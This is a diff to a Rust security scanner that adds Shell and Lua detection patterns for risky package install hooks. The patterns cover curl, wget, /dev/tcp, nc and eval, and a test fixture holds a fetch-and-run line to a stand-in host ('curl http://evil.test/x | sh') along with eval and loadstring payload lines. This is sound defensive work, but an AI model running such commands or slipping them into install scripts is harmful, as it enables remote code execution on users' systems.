@@ -22,6 +22,9 @@ pub enum Lang {
     /// C and C++ (shared headers, overlapping surface).
     Cpp,
     Perl,
+    /// Shell (sh/bash/zsh) - covers OS-package install hooks.
+    Shell,
+    Lua,
 }
 
 impl Lang {
@@ -36,6 +39,8 @@ impl Lang {
         Lang::Java,
         Lang::Cpp,
         Lang::Perl,
+        Lang::Shell,
+        Lang::Lua,
     ];
 
     fn exts(self) -> &'static [&'static str] {
@@ -49,6 +54,8 @@ impl Lang {
             Lang::Java => &["java", "kt"],
             Lang::Cpp => &["c", "h", "cpp", "cc", "cxx", "hpp", "hh", "hxx"],
             Lang::Perl => &["pl", "pm", "t"],
+            Lang::Shell => &["sh", "bash", "zsh", "ksh"],
+            Lang::Lua => &["lua"],
         }
     }
     fn apis(self) -> &'static [&'static str] {
@@ -172,6 +179,38 @@ impl Lang {
                 "Net::FTP",
                 "syscall(",
             ],
+            // Shell - the install-hook surface: fetch-and-run, decode, escalate,
+            // persist. High-value for OS-package maintainer scripts / scriptlets.
+            Lang::Shell => &[
+                "curl ",
+                "wget ",
+                "/dev/tcp/",
+                "nc ",
+                "ncat ",
+                "eval ",
+                "base64 -d",
+                "base64 --decode",
+                "chmod +x",
+                "chmod 777",
+                "crontab",
+                "systemctl enable",
+                "launchctl load",
+                "useradd",
+                "iptables",
+            ],
+            // Lua - RPM/dnf scriptlets and embedded interpreters.
+            Lang::Lua => &[
+                "os.execute",
+                "io.popen",
+                "os.getenv",
+                "loadstring",
+                "package.loadlib",
+                "require('socket')",
+                "require(\"socket\")",
+                "ffi.",
+                "posix.",
+                "os.remove",
+            ],
         }
     }
 }
@@ -232,6 +271,24 @@ mod tests {
         let detail = &f[0].detail;
         assert!(detail.contains("system("), "{detail}");
         assert!(detail.contains("dlopen("), "{detail}");
+    }
+
+    #[test]
+    fn flags_shell_and_lua_primitives() {
+        let sh = scan_one(
+            "hook.sh",
+            "#!/bin/sh\ncurl http://evil.test/x | sh\nchmod +x /tmp/x\neval \"$PAYLOAD\"\n",
+            Lang::Shell,
+        );
+        let d = &sh[0].detail;
+        assert!(d.contains("curl "), "{d}");
+        assert!(d.contains("chmod +x"), "{d}");
+        assert!(d.contains("eval "), "{d}");
+
+        let lua = scan_one("s.lua", "os.execute('id')\nlocal f = loadstring(payload)\n", Lang::Lua);
+        let d = &lua[0].detail;
+        assert!(d.contains("os.execute"), "{d}");
+        assert!(d.contains("loadstring"), "{d}");
     }
 
     #[test]
